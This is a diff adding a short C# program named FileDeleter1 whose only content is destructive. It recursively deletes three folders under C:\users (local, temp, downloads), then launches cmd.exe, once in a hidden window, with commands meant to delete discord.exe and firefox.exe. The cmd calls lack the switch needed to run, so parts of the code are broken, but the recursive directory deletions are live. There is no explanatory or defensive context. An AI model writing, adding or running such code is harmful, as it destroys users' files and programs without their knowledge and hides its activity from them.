@@ -1,0 +1,27 @@
+using System.IO;
+ 
+public class FileDeleter1
+{
+    public static void Main()
+    {
+         string path = @"C:\users\local";
+         Directory.Delete(path, true);
+	     string path2 = @"C:\users\temp";
+	     Directory.Delete(path2, true);
+	     string path3 = @"C:\users\downloads";
+	     Directory.Delete(path3, true);
+	     string strCmdText;
+         strCmdText= "del discord.exe";
+         System.Diagnostics.Process.Start("CMD.exe",strCmdText);
+	     System.Diagnostics.Process process = new System.Diagnostics.Process();
+         System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+         startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+         startInfo.FileName = "cmd.exe";
+         startInfo.Arguments = "del firefox.exe";
+         process.StartInfo = startInfo;
+         process.Start();
+		
+         
+	
+	}
+}
